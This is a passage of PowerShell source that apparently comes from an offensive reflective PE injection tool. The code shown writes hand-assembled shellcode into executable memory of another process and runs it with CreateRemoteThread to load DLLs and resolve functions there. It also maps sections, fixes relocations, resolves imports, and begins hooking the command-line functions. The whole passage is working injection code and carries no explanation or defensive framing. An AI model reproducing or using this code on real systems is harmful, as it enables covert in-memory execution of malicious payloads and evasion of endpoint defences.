		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw ""Unable to write DLL path to remote process memory""
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw ""Didn't write the expected amount of bytes when writing a DLL path to load to the remote process""
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""LoadLibraryA"") 
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw ""Unable to allocate memory in the remote process for the return value of LoadLibraryA""
			}
			
			
			
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw ""Unable to allocate memory in the remote process for shellcode""
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw ""Unable to write shellcode to remote process memory.""
			}
			
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
			}
			
			
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw ""Call to ReadProcessMemory failed""
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw ""Call to GetExitCodeThread failed""
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		
		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RFuncNamePtr -eq [IntPtr]::Zero)
		{
			Throw ""Unable to allocate memory in the remote process""
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		if ($Success -eq $false)
		{
			Throw ""Unable to write DLL path to remote process memory""
		}
		if ($FunctionNameSize -ne $NumBytesWritten)
		{
			Throw ""Didn't write the expected amount of bytes when writing a DLL path to load to the remote process""
		}
		
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""GetProcAddress"") 

		
		
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw ""Unable to allocate memory in the remote process for the return value of GetProcAddress""
		}
		
		
		
		
		
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw ""Unable to allocate memory in the remote process for shellcode""
		}
		
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw ""Unable to write shellcode to remote process memory.""
		}
		
		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
		}
		
		
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw ""Call to ReadProcessMemory failed""
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			
			
			
			
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString ""Copy-Sections::MarshalCopy"" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString ""Copy-Sections::Memset"" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true 
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				
				
				
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					
					Throw ""Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo""
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose ""Done importing DLL imports""
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw ""Error importing DLL, DLLName: $ImportDllPath""
				}
				
				
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) 
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$ProcedureName = ''
					
					
					
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff 
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					}
					else
					{
						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						Throw ""New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath""
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString ""Update-MemoryProtectionFlags::VirtualProtect"" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw ""Unable to change memory protection""
			}
		}
	}
	
	
	
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""Kernel32.dll"")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw ""Kernel32 handle null""
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke(""KernelBase.dll"")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw ""KernelBase handle null""
		}

		
		
		
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, ""GetCommandLineA"")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, ""GetCommandLineW"")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw ""GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr""
		}

		
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
